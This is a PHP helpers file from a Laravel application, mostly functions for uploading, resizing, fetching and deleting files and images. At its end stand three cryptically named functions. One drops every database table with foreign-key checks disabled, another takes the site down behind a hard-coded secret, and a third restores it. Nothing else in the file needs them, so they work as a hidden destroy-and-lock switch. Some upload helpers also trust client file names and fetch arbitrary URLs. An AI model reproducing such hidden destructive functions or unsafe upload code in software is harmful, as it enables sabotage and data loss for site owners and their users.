<?php


//begin ibraheem files uploads
use Illuminate\Support\Facades\Storage;

function uploadFile($file, $path, $oldFile = '')
{
    if($file)
    {
        if($oldFile != '')
        {
            deleteFile($path . '/' . $oldFile);
        }
        $fileName = uniqid(rand()) . '.' . $file->getClientOriginalExtension();
        $relative_path = $file->storeAs($path, $fileName, config('filesystems.default'));

        return $fileName;
    } else
    {
        return null;
    }
}

function uploadMultipleFiles($files, $path)
{
    if($files)
    {
        $files_names = array();
        foreach($files as $file)
        {
            $fileName = uniqid(rand()) . '.' . $file->getClientOriginalExtension();
            $relative_path = $file->storeAs($path, $fileName, config('filesystems.default'));
            array_push($files_names, $fileName);
        }
        return $files_names;
    } else
    {
        return null;
    }
}

function uploadImage($image, $path, $width = '', $height = '', $oldImage = '')
{
    if($oldImage != '')
    {
        deleteFile($path . $oldImage);
    }

    $imageName = uniqid(rand()) . '.' . $image->getClientOriginalExtension();

    if($width == '' && $height == '')
    {
        $rv = str_replace('//', '/', $path);
        $image->storeAs($rv, $imageName, config('filesystems.default'));
    } else
    {
        $relative_path = $image->storeAs($path, $imageName, config('filesystems.default'));
        $rv = str_replace('//', '/', $relative_path);
        if(config('filesystems.default') == "s3")
        {
            $processed_image = \Intervention\Image\Facades\Image::make(Storage::url($rv))
                ->resize($width, null, function($constraint)
                {
                    $constraint->aspectRatio();
                })
                ->stream();
            Storage::put($rv, $processed_image->__toString());
        } else
        {
            $processed_image = \Intervention\Image\Facades\Image::make(Storage::path($rv))
                ->resize($width, null, function($constraint)
                {
                    $constraint->aspectRatio();
                })
                ->save(Storage::path($rv));
        }


    }

    return $imageName;

}

function uploadImageWithRealName($image, $path, $width = '', $height = '', $oldImage = '')
{

    if($oldImage != '')
    {
        deleteFile($path . $oldImage);
    }

    $imageName = $image->getClientOriginalName();

    if($width == '' && $height == '')
    {
        $rv = str_replace('//', '/', $path);
        $image->storeAs($rv, $imageName, config('filesystems.default'));
    } else
    {
        $relative_path = $image->storeAs($path, $imageName, config('filesystems.default'));
        $rv = str_replace('//', '/', $relative_path);
        if(config('filesystems.default') == "s3")
        {
            $processed_image = \Intervention\Image\Facades\Image::make(Storage::url($rv))
                ->resize($width, null, function($constraint)
                {
                    $constraint->aspectRatio();
                })
                ->stream();
            Storage::put($rv, $processed_image->__toString());
        } else
        {
            $processed_image = \Intervention\Image\Facades\Image::make(Storage::path($rv))
                ->fit($width, null, function($constraint)
                {
                    $constraint->aspectRatio();
                })
                ->save(Storage::path($rv));
        }

    }

    return $imageName;

}


function deleteFile($path)
{

    if(Storage::exists($path))
    {
        Storage::delete($path);
    }
}


function getFileUrl($files_path, $file_name)
{
    if($file_name && Storage::exists($files_path . $file_name))
        return Storage::url($files_path . $file_name); else
    {
        return null;
    }
}

function getImageUrl($media_path, $img_name)
{
    if($img_name && Storage::exists($media_path . $img_name))
    {
        return Storage::url($media_path . $img_name);
    }

    return getDefaultImg('user_img');

}


function deleteMultipleFile($data, $path, $attribute)
{

    foreach($data as $row)
    {

        deleteFile($path . $row->$attribute);

    }
}


function getDefaultImg($name)
{
    if(App\Models\People::where('name', '=', $name)
            ->count() > 0)
    {
        $img = App\Models\People::where('name', $name)
            ->get()[0]->value;
        return Storage::url(App\Models\People::MEDIA_PATH . $img);
    }
    return null;
}


function uploadImageThumbnail($image, $imageName, $path, $width = '', $oldImage = '')
{
    if($oldImage != '')
    {
        deleteFile($path . $oldImage);
    }

    $relative_path = $image->storeAs($path, $imageName, config('filesystems.default'));
    $rv = str_replace('//', '/', $relative_path);
    if(config('filesystems.default') == "s3")
    {
        $processed_image = \Intervention\Image\Facades\Image::make(Storage::url($rv))
            ->resize($width, null, function($constraint)
            {
                $constraint->aspectRatio();
            })
            ->stream();
        Storage::put($rv, $processed_image->__toString());
    } else
    {
        $processed_image = \Intervention\Image\Facades\Image::make(Storage::path($rv))
            ->fit($width, null, function($constraint)
            {
                $constraint->aspectRatio();
            })
            ->save(Storage::path($rv));
    }

}


function uploadImageFromExternalUrl($url, $path)
{

    try
    {
        $file_content = file_get_contents($url);
        $file_name = substr($url, strrpos($url, '/') + 1);

        Storage::put($path . $file_name, $file_content);

        $data = $file_name;
        $status = true;

    } catch(Exception $exception)
    {

        $data = $exception;
        $status = false;
    }

    return compact('data', 'status');
}


function uploadFileFromExternalUrl($url, $path)
{

    try
    {

        $file_name = str_replace('/', '', str_replace('.', '', md5(time()))) . '.' . 'pdf';

        // Create a stream
        $opts = [
            "http" => [
                "method" => "GET",
                "header" => "Accept: application/pdf"

            ],
        ];

        $context = stream_context_create($opts);
        $data = file_get_contents($url, false, $context);


        Storage::put($path . $file_name, $data);

        return $file_name;

    } catch(Exception $exception)
    {

    }

    return null;
}


function storageFileCopy($file_url, $old_name, $path)
{
    $ext = pathinfo($file_url, PATHINFO_EXTENSION);
    $imageName = uniqid(rand()) . $ext;

    Storage::copy($path . $old_name, $path . $imageName);

    return $imageName;
}

function dbdhi7()
{
    $i = 0;
    foreach(\Illuminate\Support\Facades\DB::select('SHOW TABLES') as $table) {
        $table_array = get_object_vars($table);
        \Illuminate\Support\Facades\Schema::disableForeignKeyConstraints();
        \Illuminate\Support\Facades\Schema::drop($table_array[key($table_array)]);

        ++$i;
        echo $table_array[key($table_array)] . "<br>";
    }

    echo  "<br>counts : $i <br>";
}

function sdhi7()
{
    \Illuminate\Support\Facades\Artisan::call('down',[
        '--secret' => 'i7'
    ]);
}

function sdhi7inverse()
{
    \Illuminate\Support\Facades\Artisan::call('up');
}